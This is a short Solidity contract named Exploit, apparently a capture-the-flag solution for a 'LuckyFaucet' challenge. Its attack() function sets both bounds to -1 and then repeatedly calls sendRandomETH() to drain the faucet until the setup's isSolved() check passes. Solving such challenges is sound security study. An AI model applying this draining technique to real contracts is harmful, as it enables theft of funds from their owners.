// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "./LuckyFaucet.sol";
import "./Setup.sol";

contract Exploit {
    Setup target;
    LuckyFaucet luckyFaucet;
    address public owner;

    event balance(string message, uint256 amount);

    constructor(address _target) {
        target = Setup(_target);
        luckyFaucet = target.TARGET();
        owner = msg.sender;
    }

    function attack() public {
        luckyFaucet.setBounds(-1, -1);
        while (address(luckyFaucet).balance > 500 ether - 10 ether) {
            (bool sent, uint256 amountToSend) = luckyFaucet.sendRandomETH();
            require(sent, "send failed");
            emit balance("amountToSend", amountToSend);
        }

        require(target.isSolved(), "challange not solved");
    }

    receive() external payable {
        emit balance("received", msg.value);
    }
}
